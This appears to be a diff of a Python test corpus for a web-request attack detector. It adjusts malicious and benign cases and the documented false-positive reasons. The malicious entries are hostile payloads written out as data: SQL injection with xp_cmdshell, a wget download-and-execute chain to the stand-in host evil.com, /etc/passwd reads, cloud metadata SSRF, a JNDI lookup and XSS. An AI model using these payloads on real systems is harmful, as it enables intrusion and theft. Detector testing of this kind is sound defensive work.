@@ -6,6 +6,7 @@ import pytest
 
 from guard_core.handlers.suspatterns_handler import (
     ALL_DETECTION_CATEGORIES,
+    CATEGORY_CONTEXT_MAP,
     SusPatternsManager,
 )
 from guard_core.models import SecurityConfig
@@ -64,23 +65,19 @@ _TRUNCATION_FILLER = (
     "and highlights the onboarding funnel improvements shipped last sprint. "
 ) * 90
 
-_EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON = (
-    "a bare probe path embedded in a full prose sentence cannot be told apart "
-    "from a benign prose sentence mentioning the same shape of path using "
-    "structural pattern matching alone: word-bounding the path as an isolated "
-    "token reproduces the false-positive shape defect 1 removed (34/41 benign "
-    "prose-with-path strings false-positived when measured against this exact "
-    "corpus), and gating on nearby attack-implying keywords instead is not a "
-    "reliable discriminator (it misses the literal motivating case 'the "
-    "scanner hit /wp-admin/install.php' because 'Note:' collides with the "
-    "same vocabulary legitimate incident reports use, and a real attacker can "
-    "phrase the identical probe without any alarming word). Measured against "
-    "a 32-malicious/41-benign corpus built for this defect: 0/32 recall and "
-    "0/41 FP unmodified; bare-token matching reaches 31/32 recall but 34/41 "
-    "FP; keyword co-occurrence reaches 0/41 FP but only 28/32 recall and "
-    "misses the headline example. Neither candidate clears both gates, so "
-    "this stays a documented, measured gap"
+_AMBIGUOUS_BACKTICK_INJECTION_REQUEST_BODY_KNOWN_GAP_REASON = (
+    "_AMBIGUOUS_BACKTICK_INJECTION_CONTEXTS in _suspatterns_shell_sources.py "
+    "deliberately resolves an ambiguous glued-backtick or dollar-substitution "
+    "match as a hit only in query_param/url_path, by design, because prose "
+    "and markdown legitimately carry backticks and $(...) in request bodies; "
+    "this item is detected on query_param and url_path and undetected on "
+    "request_body by that same rule. Widening the rule to request_body was "
+    "measured: +8 detections in this class but +8 new benign hits (jQuery "
+    "selector calls, Makefile variable references, shell-docs var expansion, "
+    "glued kebab identifiers), so the rule stays narrow and this is the "
+    "documented cost"
 )
+
 
 _SEMICOLON_QUOTED_SHELL_KNOWN_FP_REASON = (
     "a quoted absolute-path or env-prefixed shell invocation after a "
@@ -128,62 +125,99 @@ _ENV_VAR_PREFIXED_SHELL_DASH_C_CI_CONFIG_KNOWN_FP_REASON = (
     "injection shape it was built to catch"
 )
 
+_SQLI_ORDER_BY_BARE_DIGIT_KNOWN_FP_REASON = (
+    "a standalone 'ORDER BY <digit>' with no SQL comment/statement "
+    "terminator after it is character-identical to a real sort-order "
+    "value or path segment a REST API commonly carries (a sort "
+    "parameter, a column-index path segment); _SQLI_ORDER_BY_TERMINATOR_RE "
+    "has matched this bare shape on query_param/request_body since "
+    "before this widening round and continues to, so this is a "
+    "newly-disclosed, not newly-introduced, false positive on those two "
+    "contexts; the pattern is narrowed to _CTX_SQLI_NARROW "
+    "(_suspatterns_pattern_table.py) precisely so header/url_path, "
+    "newly enabled by this round, do not inherit it"
+)
+
+_SQLI_GLUED_COMMENT_ANNOTATION_KNOWN_FP_REASON = (
+    "a C-style /* ... */ comment glued between two word characters is "
+    "the exact obfuscation shape SQL keyword-splitting evasion uses "
+    "(SEL/**/ECT) and is also the exact shape of an ordinary inline "
+    "unit or config annotation (timeout/*ms*/30); this pattern has "
+    "matched that shape on query_param/request_body since before this "
+    "widening round, so this is a newly-disclosed, not "
+    "newly-introduced, false positive there; no malicious corpus entry "
+    "depends on this pattern reaching header/url_path (measured: 0 of "
+    "36 sqli cases), so it is narrowed to _CTX_SQLI_NARROW there with "
+    "zero recall cost"
+)
+
+_SQLI_EXEC_PROSE_INSTRUCTION_KNOWN_FP_REASON = (
+    "'EXEC(UTE) sp_/xp_<name>' with no statement-separator or quote "
+    "immediately before it is indistinguishable from an operational "
+    "runbook or support-ticket instruction naming a real stored "
+    "procedure by its sp_/xp_-prefixed name; this pattern has matched "
+    "that shape on query_param/request_body since before this widening "
+    "round, so this is a newly-disclosed, not newly-introduced, false "
+    "positive there. The added _SQLI_EXEC_STRONG_RE variant (requires "
+    "the match to be preceded only by ';', a quote, or the start of "
+    "the string) recovers full recall on header/url_path for the two "
+    "corpus entries that actually carry that separator ('1; EXEC "
+    "xp_cmdshell(...)', '1; EXECUTE sp_configure') without also "
+    "matching this prose shape there; the original, "
+    "separator-tolerant pattern stays narrowed to query_param/"
+    "request_body"
+)
+
 _RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON = (
     "the dedicated RFI file_inclusion pattern flags any param-value "
     "delivery of an explicit http(s)/ftp URL whose final path segment ends "
     "in one of the RFI executable/includable target extensions; a genuine "
-    "raw-doc download link (README.txt, readme.txt, terms.txt) and a "
-    "genuine curl-pipe installer or legacy cgi-bin link (install.sh, "
-    "search.cgi) are character-identical to that param=scheme://host/"
-    "path.ext RFI payload shape and cannot be told apart by extension "
-    "alone; an app that legitimately serves such download or installer "
-    "links needs route-level allowlisting, not a narrower pattern that "
-    "would lose recall on the backdoor.txt/backdoor.pl-shaped payloads "
-    "this pattern was built to catch"
+    "raw-doc download link (README.txt, readme.txt, terms.txt) is "
+    "character-identical to that param=scheme://host/path.ext RFI payload "
+    "shape and cannot be told apart by extension alone, because the "
+    "backdoor.txt-shaped payload this pattern was built to catch depends "
+    "on the fetched content containing script tags, not on the extension "
+    "or path depth; an app that legitimately serves such download links "
+    "needs route-level allowlisting, not a narrower pattern that would "
+    "lose recall on file_inclusion_rfi_https_domain_backdoor_txt. The "
+    ".sh/.cgi target extensions were dropped from the alternation instead: "
+    "0 malicious corpus entries depend on either (measured), so "
+    "install.sh/search.cgi-shaped curl-pipe installer and legacy cgi-bin "
+    "links no longer collide with this pattern at zero recall cost"
 )
 
-_SSTI_CALL_OR_FILTER_SYNTAX_KNOWN_FP_REASON = (
-    "the shape-gated {{ }}/#{ } template patterns flag any request-value "
-    "delivery of a double-curly or hash-brace expression containing a bare "
-    "function-call shape (a word immediately followed by parentheses); a "
-    "genuine template's own filter or method call syntax (format(x), a "
-    "Jinja round(2) filter, a Ruby helper.format(value) call, a JS-style "
-    ".map(item => ...) arrow callback) is character-identical to that "
-    "call-branch SSTI shape and cannot be told apart by structure alone; "
-    "an app that legitimately accepts raw template source as a request "
-    "value needs route-level allowlisting, not a narrower pattern that "
-    "would lose recall on the {{config.items()}}/#{T(...).exec(...)} "
-    "RCE shape this gate was built to catch"
+_SSTI_HASH_BRACE_CALL_SYNTAX_KNOWN_FP_REASON = (
+    "the hash-brace #{ } shape gate's call-branch flags any bare "
+    "function-call shape (a word immediately followed by parentheses) "
+    "appearing anywhere inside the braces; a genuine method call on a "
+    "string or object (helper.format(value)) is character-identical to "
+    "that call-branch SSTI shape and cannot be told apart by structure "
+    "alone. Narrowing the call-branch to empty-parens-only (as the "
+    "sibling {{ }} gate now does) was tried and reverted: it lost recall "
+    "on two real corpus dependents that pass non-empty arguments to the "
+    "flagged call (template_ssti_hash_brace_java_runtime_exec's "
+    "T(java.lang.Runtime).exec('id'), and the embedded-terminator regression "
+    'corpus\'s #{"a#b".gsub(/x/,"y")}); an app that legitimately accepts '
+    "raw template source as a request value needs route-level "
+    "allowlisting, not a narrower call-branch"
 )
 
-_SSTI_DATE_IN_BRACES_KNOWN_FP_REASON = (
-    "the quote-tolerant arithmetic branch of the {{ }}/#{ } shape gate "
-    "matches any digit-operator-digit run, and a hyphen-delimited date "
-    "embedded in braces ({{ 2024-01-02 }}, #{2024-12-31}) parses as "
-    "digit-minus-digit subtraction; a genuine date-in-braces value is "
-    "character-identical to that arithmetic SSTI shape and cannot be told "
-    "apart by structure alone; an app that legitimately delivers dates "
-    "inside template-looking braces needs route-level allowlisting, not a "
-    "narrower pattern that would lose recall on the {{7*7}}/{{7*'7'}} "
-    "arithmetic-probe shape this branch was built to catch"
-)
 
-_FILENAME_MENTIONED_IN_PROSE_WITH_SPACED_EQUALS_KNOWN_FP_REASON = (
-    "the filename= file_upload patterns flag any occurrence of "
-    'filename="...ext" (quotes required, whitespace now tolerated around '
-    "the =) anywhere in scanned content, with no requirement that it sit "
-    "inside an actual multipart Content-Disposition header; a support "
-    "ticket, changelog, or code-review comment that quotes a dangerous "
-    'filename as a worked example (filename = "invoice.php") is '
-    "character-identical to a real upload's filename value and cannot be "
-    "told apart by structure alone; an app that legitimately accepts such "
-    "prose as a request value needs route-level allowlisting, not a "
-    "narrower pattern that would lose recall on the real "
-    'filename="shell.php"-shaped payload this pattern exists to catch. '
-    "This exact shape already matched with no whitespace around the = "
-    'before this round\'s fix (filename="invoice.php"); the whitespace '
-    "tolerance widens which spacing variants reach the same pre-existing, "
-    "unresolved tradeoff, it does not create a new one"
+_SSRF_BARE_PRIVATE_IP_NO_URL_CONTEXT_KNOWN_FP_REASON = (
+    "a bare private/loopback/link-local IP address extracted from a query "
+    "param, header, or JSON body field value, with no surrounding URL "
+    "context (no scheme, no path segment after it, no port), is "
+    "character-identical to the same bare IP planted as a raw SSRF probe "
+    "value in that same field; test_ssrf_corpus.py::KNOWN_GOOD_SSRF_TARGETS "
+    "pins the identical bare shape ('10.0.0.5', '127.0.0.1', "
+    "'192.168.1.1') as a required detection so a metadata/loopback/private "
+    "IP dropped bare into any field is still caught, and cannot be told "
+    "apart by structure alone from a legitimate internal upstream/host "
+    "value. An application that legitimately carries bare internal IPs in "
+    "a named field should exclude that field via "
+    "excluded_detection_params/excluded_detection_headers/"
+    "excluded_detection_body_fields rather than narrowing the pattern and "
+    "losing recall on the bare-IP SSRF probe shape"
 )
 
 
@@ -329,6 +363,12 @@ MALICIOUS_CORPUS: list[MaliciousCase] = [
         "sort=ORDER BY 1\nX-Extra-Header: value",
     ),
     MaliciousCase("sqli_standalone_order_by_control", "sqli", "ORDER BY 1"),
+    MaliciousCase(
+        "sqli_waitfor_delay_path_segment",
+        "sqli",
+        "/reports/WAITFOR DELAY '0:0:5'",
+    ),
+    MaliciousCase("sqli_waitfor_time_header_value", "sqli", "WAITFOR TIME '12:00:00'"),
     MaliciousCase(
         "dir_traversal_double_dotdot_slash", "dir_traversal", "../../../../etc/passwd"
     ),
@@ -481,10 +521,6 @@ MALICIOUS_CORPUS: list[MaliciousCase] = [
         "cmd_injection",
         _TRUNCATION_FILLER + "`whoami`",
         "encoding_aware",
-        "truncate_safely keeps roughly 100 chars of surrounding filler "
-        "context around a preserved attack region, which breaks the backtick "
-        "pattern's whole-string \\A...\\Z anchor even though the payload "
-        "itself survives truncation",
     ),
     MaliciousCase("cmd_shell_dash_c_at_string_start", "cmd_injection", "sh -c id"),
     MaliciousCase(
@@ -718,6 +754,12 @@ MALICIOUS_CORPUS: list[MaliciousCase] = [
         "http://[::ffff:127.0.0.1]/",
     ),
     MaliciousCase("ssrf_localhost_trailing_dot", "ssrf", "http://localhost./"),
+    MaliciousCase(
+        "ssrf_metadata_ip_with_path_after_extraction",
+        "ssrf",
+        "169.254.169.254/latest/meta-data/",
+    ),
+    MaliciousCase("ssrf_loopback_with_port_after_extraction", "ssrf", "127.0.0.1:6379"),
     MaliciousCase("nosql_gt_operator_quoted", "nosql", '{"$gt":""}'),
     MaliciousCase("nosql_ne_operator_quoted", "nosql", '{"$ne":null}'),
     MaliciousCase(
@@ -912,17 +954,6 @@ MALICIOUS_CORPUS: list[MaliciousCase] = [
     ),
     MaliciousCase("cms_probing_phpinfo_with_query", "cms_probing", "/info.php?x=1"),
     MaliciousCase(
-        "cms_probing_embedded_wp_admin_setup_config_in_sentence",
-        "cms_probing",
-        "Redirecting to http://example.com/wp-admin/setup-config.php now",
-        "production",
-        "a scheme-embedded URL inside prose is structurally identical to a "
-        "support ticket or changelog quoting the same URL (2 of 2 measured "
-        "benign quoting cases false-positived when this alternative existed), "
-        "so the scheme-embedded alternative was removed from the cms_probing "
-        "pattern; only a standalone path still matches",
-    ),
-    MaliciousCase(
         "cms_probing_standalone_wp_admin_setup_config_control",
         "cms_probing",
         "/wp-admin/setup-config.php",
@@ -1025,227 +1056,163 @@ MALICIOUS_CORPUS: list[MaliciousCase] = [
         "cms_probing_embedded_prose_scanner_hit_install_php",
         "cms_probing",
         "Note: the scanner hit /wp-admin/install.php on our staging host.",
-        "production",
-        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
     ),
     MaliciousCase(
         "cms_probing_embedded_prose_bot_probed_install_php",
         "cms_probing",
         "Intrusion alert: a bot probed /wp-admin/install.php from 203.0.113.9.",
-        "production",
-        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
     ),
     MaliciousCase(
         "cms_probing_embedded_prose_waf_blocked_setup_config",
         "cms_probing",
         "Our WAF blocked a request targeting /wp-admin/setup-config.php just now.",
-        "production",
-        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
     ),
     MaliciousCase(
         "cms_probing_embedded_prose_exploit_xmlrpc",
         "cms_probing",
         "Someone attempted to exploit /xmlrpc.php on the checkout server overnight.",
-        "production",
-        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
     ),
     MaliciousCase(
         "cms_probing_embedded_prose_attacker_payload_wp_login",
         "cms_probing",
         "The attacker's payload tried to reach /wp-login.php with brute-force "
         "credentials.",
-        "production",
-        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
     ),
     MaliciousCase(
         "cms_probing_embedded_prose_malicious_probe_phpinfo",
         "cms_probing",
         "Security team confirmed a malicious probe against /phpinfo.php last night.",
-        "production",
-        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
     ),
     MaliciousCase(
         "cms_probing_embedded_prose_exploitation_attempts_install_php",
         "cms_probing",
         "Logs show repeated exploitation attempts on /wp-admin/install.php this "
         "morning.",
-        "production",
-        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
     ),
     MaliciousCase(
         "cms_probing_embedded_prose_botnet_scanning_setup_config",
         "cms_probing",
         "A known botnet is scanning for /wp-admin/setup-config.php across our fleet.",
-        "production",
-        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
     ),
     MaliciousCase(
         "sensitive_file_embedded_prose_attacker_git_config",
         "sensitive_file",
         "We detected an attacker trying to access /.git/config on the public endpoint.",
-        "production",
-        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
     ),
     MaliciousCase(
         "sensitive_file_embedded_prose_threat_feed_var_www_env",
         "sensitive_file",
         "Threat feed flagged traffic hitting /var/www/.env from a Tor exit node.",
-        "production",
-        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
     ),
     MaliciousCase(
         "dir_traversal_embedded_prose_honeypot_etc_passwd",
         "dir_traversal",
         "The honeypot recorded a request to /etc/passwd from an unknown scanner.",
-        "production",
-        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
     ),
     MaliciousCase(
         "cms_probing_embedded_prose_scanner_hit_htpasswd",
         "cms_probing",
         "Vulnerability scanner attempted a hit on /.htpasswd during the pentest.",
-        "production",
-        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
     ),
     MaliciousCase(
         "cms_probing_embedded_prose_blocked_probe_install_php",
         "cms_probing",
         "Blocked malicious traffic: a probe against /wp-admin/install.php was denied.",
-        "production",
-        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
     ),
     MaliciousCase(
         "cms_probing_embedded_prose_repeated_attacks_xmlrpc",
         "cms_probing",
         "Suspicious activity: repeated attacks on /xmlrpc.php from a botnet.",
-        "production",
-        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
     ),
     MaliciousCase(
         "cms_probing_embedded_prose_pentest_exploitation_setup_config",
         "cms_probing",
         "The pentest log shows exploitation of /wp-admin/setup-config.php succeeded.",
-        "production",
-        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
     ),
     MaliciousCase(
         "cms_probing_embedded_prose_intrusion_detection_phpinfo",
         "cms_probing",
         "Intrusion detection triggered on a request for /phpinfo.php from a scanner.",
-        "production",
-        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
     ),
     MaliciousCase(
         "cms_probing_embedded_prose_credential_stuffing_wp_login",
         "cms_probing",
         "A malicious actor tried /wp-login.php with a credential-stuffing list.",
-        "production",
-        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
     ),
     MaliciousCase(
         "sensitive_file_embedded_prose_bad_actor_dotenv",
         "sensitive_file",
         "We caught a bad actor probing /.env on the load balancer.",
-        "production",
-        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
     ),
     MaliciousCase(
         "cms_probing_embedded_prose_attacker_pivot_install_php",
         "cms_probing",
         "The attacker pivoted and hit /wp-admin/install.php right after recon.",
-        "production",
-        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
     ),
     MaliciousCase(
         "cms_probing_embedded_prose_soc_exploit_setup_config",
         "cms_probing",
         "SOC confirmed the exploit attempt against /wp-admin/setup-config.php.",
-        "production",
-        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
     ),
     MaliciousCase(
         "cms_probing_embedded_prose_attack_tooling_xmlrpc",
         "cms_probing",
         "Automated attack tooling scanned for /xmlrpc.php on every subdomain.",
-        "production",
-        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
     ),
     MaliciousCase(
         "sensitive_file_embedded_prose_scanner_git_config",
         "sensitive_file",
         "The scanner also hit /.git/config while enumerating the site.",
-        "production",
-        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
     ),
     MaliciousCase(
         "cms_probing_embedded_prose_hostile_probe_install_php",
         "cms_probing",
         "We saw a hostile probe against /wp-admin/install.php at 3am.",
-        "production",
-        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
     ),
     MaliciousCase(
         "cms_probing_embedded_prose_malicious_crawler_phpinfo_wp_login",
         "cms_probing",
         "Malicious crawler attempted /phpinfo.php then moved to /wp-login.php.",
-        "production",
-        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
     ),
     MaliciousCase(
         "sensitive_file_embedded_prose_intrusion_var_www_env",
         "sensitive_file",
         "The intrusion attempt against /var/www/.env was blocked by the WAF.",
-        "production",
-        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
     ),
     MaliciousCase(
         "cms_probing_embedded_prose_exploit_kit_setup_config",
         "cms_probing",
         "An exploit kit tried to reach /wp-admin/setup-config.php twice.",
-        "production",
-        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
     ),
     MaliciousCase(
         "cms_probing_embedded_prose_attack_traffic_install_php",
         "cms_probing",
         "Attack traffic hit /wp-admin/install.php from a known bad IP range.",
-        "production",
-        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
     ),
     MaliciousCase(
         "cms_probing_embedded_prose_scanner_htpasswd_credentials",
         "cms_probing",
         "The scanner probed /.htpasswd looking for exposed credentials.",
-        "production",
-        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
     ),
     MaliciousCase(
         "cms_probing_embedded_prose_bruteforce_bot_wp_login",
         "cms_probing",
         "A brute-force bot hit /wp-login.php more than 500 times overnight.",
-        "production",
-        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
     ),
     MaliciousCase(
         "cms_probing_embedded_prose_recon_activity_xmlrpc",
         "cms_probing",
         "Recon activity included a hit on /xmlrpc.php before the real attack.",
-        "production",
-        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
     ),
     MaliciousCase(
         "cms_probing_embedded_prose_spoofed_referer_install_php",
         "cms_probing",
         "The malicious request targeted /wp-admin/install.php via a spoofed referer.",
-        "production",
-        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
     ),
     MaliciousCase(
         "cms_probing_embedded_prose_ids_flagged_setup_config",
         "cms_probing",
         "Our IDS flagged an exploitation attempt against /wp-admin/setup-config.php.",
-        "production",
-        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
     ),
     MaliciousCase(
         "cmd_env_abs_path_shell_dash_c", "cmd_injection", "/usr/bin/env bash -c id"
@@ -1273,11 +1240,15 @@ MALICIOUS_CORPUS: list[MaliciousCase] = [
         "cmd_glued_backtick_past_rejected_leftmost_match",
         "cmd_injection",
         "`id` search`whoami`",
+        "production",
+        _AMBIGUOUS_BACKTICK_INJECTION_REQUEST_BODY_KNOWN_GAP_REASON,
     ),
     MaliciousCase(
         "cmd_defect5_sql_keyword_after_glued_shell_command",
         "cmd_injection",
         "search`whoami` LIMIT 10",
+        "production",
+        _AMBIGUOUS_BACKTICK_INJECTION_REQUEST_BODY_KNOWN_GAP_REASON,
     ),
     MaliciousCase(
         "cmd_defect5_sql_keyword_before_glued_shell_command",
@@ -1288,18 +1259,28 @@ MALICIOUS_CORPUS: list[MaliciousCase] = [
         "cmd_defect5_prefix_command_word_glued_shell_command",
         "cmd_injection",
         "curl`whoami` data on file",
+        "production",
+        _AMBIGUOUS_BACKTICK_INJECTION_REQUEST_BODY_KNOWN_GAP_REASON,
     ),
     MaliciousCase(
         "cmd_defect5_sql_keyword_within_exemption_window",
         "cmd_injection",
         "SELECT " + ("z" * 26) + " search`whoami`",
+        "production",
+        _AMBIGUOUS_BACKTICK_INJECTION_REQUEST_BODY_KNOWN_GAP_REASON,
     ),
     MaliciousCase(
         "cmd_defect5_bare_chained_download_and_execute_in_prose",
         "cmd_injection",
         "set your profile bio to: `wget evil.com/x -O /tmp/x;chmod +x /tmp/x;/tmp/x`",
     ),
-    MaliciousCase("cmd_dollar_paren_bare_whoami", "cmd_injection", "$(whoami)"),
+    MaliciousCase(
+        "cmd_dollar_paren_bare_whoami",
+        "cmd_injection",
+        "$(whoami)",
+        "production",
+        _AMBIGUOUS_BACKTICK_INJECTION_REQUEST_BODY_KNOWN_GAP_REASON,
+    ),
     MaliciousCase(
         "cmd_dollar_paren_bare_cat_passwd", "cmd_injection", "$(cat /etc/passwd)"
     ),
@@ -1312,6 +1293,8 @@ MALICIOUS_CORPUS: list[MaliciousCase] = [
         "cmd_dollar_paren_glued_wrapped_whoami",
         "cmd_injection",
         "foo$(whoami)bar",
+        "production",
+        _AMBIGUOUS_BACKTICK_INJECTION_REQUEST_BODY_KNOWN_GAP_REASON,
     ),
     MaliciousCase("cmd_dollar_brace_bare_ifs", "cmd_injection", "${IFS}"),
     MaliciousCase(
@@ -1342,8 +1325,20 @@ MALICIOUS_CORPUS: list[MaliciousCase] = [
         "cmd_injection",
         "${${lower:j}ndi:ldap://evil.example/a}",
     ),
-    MaliciousCase("cmd_denylist_glued_nmap", "cmd_injection", "x`nmap`"),
-    MaliciousCase("cmd_denylist_glued_powershell", "cmd_injection", "x`powershell`"),
+    MaliciousCase(
+        "cmd_denylist_glued_nmap",
+        "cmd_injection",
+        "x`nmap`",
+        "production",
+        _AMBIGUOUS_BACKTICK_INJECTION_REQUEST_BODY_KNOWN_GAP_REASON,
+    ),
+    MaliciousCase(
+        "cmd_denylist_glued_powershell",
+        "cmd_injection",
+        "x`powershell`",
+        "production",
+        _AMBIGUOUS_BACKTICK_INJECTION_REQUEST_BODY_KNOWN_GAP_REASON,
+    ),
     MaliciousCase("xss_ontoggle_details", "xss", "<details ontoggle=alert(1)>"),
     MaliciousCase("xss_onpointerdown_div", "xss", "<div onpointerdown=alert(1)>"),
     MaliciousCase("xss_onanimationstart_svg", "xss", "<svg onanimationstart=alert(1)>"),
@@ -1814,20 +1809,14 @@ BENIGN_CORPUS: list[BenignCase] = [
     BenignCase(
         "file_inclusion_benign_installer_sh_link",
         "url=https://example.com/install.sh",
-        "production",
-        _RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON,
     ),
     BenignCase(
         "file_inclusion_benign_docker_installer_sh_link",
         "url=https://get.docker.com/install.sh",
-        "production",
-        _RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON,
     ),
     BenignCase(
         "file_inclusion_benign_cgi_search_link",
         "url=https://legacy.example.com/cgi-bin/search.cgi",
-        "production",
-        _RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON,
     ),
     BenignCase(
         "ldap_prose_wildcard_search_mention",
@@ -1914,6 +1903,34 @@ BENIGN_CORPUS: list[BenignCase] = [
         "connect via tcp://8080 for the health probe",
     ),
     BenignCase(
+        "ssrf_bare_private_ip_upstream_query_param_value",
+        "10.0.0.5",
+        known_false_positive_reason=(
+            _SSRF_BARE_PRIVATE_IP_NO_URL_CONTEXT_KNOWN_FP_REASON
+        ),
+    ),
+    BenignCase(
+        "ssrf_bare_private_ip_internal_ip_header_value",
+        "10.0.0.5",
+        known_false_positive_reason=(
+            _SSRF_BARE_PRIVATE_IP_NO_URL_CONTEXT_KNOWN_FP_REASON
+        ),
+    ),
+    BenignCase(
+        "ssrf_bare_private_ip_host_query_param_value",
+        "192.168.1.10",
+        known_false_positive_reason=(
+            _SSRF_BARE_PRIVATE_IP_NO_URL_CONTEXT_KNOWN_FP_REASON
+        ),
+    ),
+    BenignCase(
+        "ssrf_bare_private_ip_json_body_field_value",
+        "10.0.0.5",
+        known_false_positive_reason=(
+            _SSRF_BARE_PRIVATE_IP_NO_URL_CONTEXT_KNOWN_FP_REASON
+        ),
+    ),
+    BenignCase(
         "rest_path_gcp_computeMetadata_no_default_segment",
         "computeMetadata/v1/instance/hostname",
     ),
@@ -1981,8 +1998,6 @@ BENIGN_CORPUS: list[BenignCase] = [
         "file_upload_prose_ticket_dangerous_filename_spaced_equals",
         "Ticket #4821: please confirm the attachment filename = "
         '"invoice.php" was renamed correctly before closing.',
-        "production",
-        _FILENAME_MENTIONED_IN_PROSE_WITH_SPACED_EQUALS_KNOWN_FP_REASON,
     ),
     BenignCase("file_upload_benign_pptx_filename", 'filename="presentation.pptx"'),
     BenignCase(
@@ -2074,6 +2089,10 @@ BENIGN_CORPUS: list[BenignCase] = [
         "cms_probing_prose_docs_wp_admin_link",
         "See notes at https://docs.example.com/wp-admin/setup-config.php for "
         "migration steps.",
+    ),
+    BenignCase(
+        "cms_probing_prose_redirect_notification_wp_admin_setup_config",
+        "Redirecting to http://example.com/wp-admin/setup-config.php now",
     ),
     BenignCase("recon_robots_txt", "/robots.txt"),
     BenignCase("recon_sitemap_xml", "/sitemap.xml"),
@@ -2574,14 +2593,10 @@ BENIGN_CORPUS: list[BenignCase] = [
     BenignCase(
         "cmd_injection_prose_semicolon_quoted_absolute_shell_ls",
         "First run setup; /bin/sh -c 'ls' to verify.",
-        "production",
-        _SEMICOLON_QUOTED_SHELL_KNOWN_FP_REASON,
     ),
     BenignCase(
         "cmd_injection_prose_semicolon_quoted_absolute_shell_whoami",
         "ticket note: reproduced by running commands; /bin/sh -c whoami showed root",
-        "production",
-        _SEMICOLON_QUOTED_SHELL_KNOWN_FP_REASON,
     ),
     BenignCase(
         "cmd_injection_prose_semicolon_quoted_env_prefixed_shell",
@@ -2593,8 +2608,6 @@ BENIGN_CORPUS: list[BenignCase] = [
     BenignCase(
         "cmd_injection_prose_semicolon_quoted_absolute_shell_debug_flag",
         "changelog: fixed default login; /bin/sh -x debug.sh now traces correctly",
-        "production",
-        _SEMICOLON_QUOTED_SHELL_KNOWN_FP_REASON,
     ),
     BenignCase(
         "cmd_injection_prose_semicolon_bare_shell_control",
@@ -2745,38 +2758,28 @@ BENIGN_CORPUS: list[BenignCase] = [
     BenignCase(
         "template_fp_date_curly_brace",
         "{{ 2024-01-02 }}",
-        "production",
-        _SSTI_DATE_IN_BRACES_KNOWN_FP_REASON,
     ),
     BenignCase(
         "template_fp_date_hash_brace",
         "#{2024-12-31}",
-        "production",
-        _SSTI_DATE_IN_BRACES_KNOWN_FP_REASON,
     ),
     BenignCase(
         "template_fp_call_branch_format_x",
         "{{ format(x) }}",
-        "production",
-        _SSTI_CALL_OR_FILTER_SYNTAX_KNOWN_FP_REASON,
     ),
     BenignCase(
         "template_fp_call_branch_round_filter",
         "{{ item.price | round(2) }}",
-        "production",
-        _SSTI_CALL_OR_FILTER_SYNTAX_KNOWN_FP_REASON,
     ),
     BenignCase(
         "template_fp_call_branch_helper_format",
         "#{ helper.format(value) }",
         "production",
-        _SSTI_CALL_OR_FILTER_SYNTAX_KNOWN_FP_REASON,
+        _SSTI_HASH_BRACE_CALL_SYNTAX_KNOWN_FP_REASON,
     ),
     BenignCase(
         "template_fp_call_branch_map_arrow",
         "{{ cart.items.map(item => item.price) }}",
-        "production",
-        _SSTI_CALL_OR_FILTER_SYNTAX_KNOWN_FP_REASON,
     ),
     BenignCase("ssrf_benign_single_at_token_userinfo", "https://token@api.example.com"),
     BenignCase("ssrf_benign_single_at_userpass", "http://user:pass@host.com"),
@@ -2794,6 +2797,46 @@ BENIGN_CORPUS: list[BenignCase] = [
     BenignCase("sqli_benign_semicolon_execute_no_proc", "; execute the plan"),
     BenignCase("sqli_benign_exec_bareword_call_shape", "execute report()"),
     BenignCase("sqli_benign_exec_qualified_proc_name", "EXEC dbo.Proc()"),
+    BenignCase(
+        "sqli_header_sort_order_by_bare_digit",
+        "order by 3",
+        "production",
+        _SQLI_ORDER_BY_BARE_DIGIT_KNOWN_FP_REASON,
+    ),
+    BenignCase(
+        "sqli_url_path_products_order_by_bare_digit",
+        "/products/order by 3",
+        "production",
+        _SQLI_ORDER_BY_BARE_DIGIT_KNOWN_FP_REASON,
+    ),
+    BenignCase(
+        "sqli_query_param_sort_order_by_bare_digit",
+        "?sort=order by 3",
+        "production",
+        _SQLI_ORDER_BY_BARE_DIGIT_KNOWN_FP_REASON,
+    ),
+    BenignCase(
+        "sqli_header_config_timeout_glued_comment",
+        "timeout/*ms*/30",
+        "production",
+        _SQLI_GLUED_COMMENT_ANNOTATION_KNOWN_FP_REASON,
+    ),
+    BenignCase(
+        "sqli_header_cookie_pref_timeout_glued_comment",
+        "pref=timeout/*ms*/30",
+        "production",
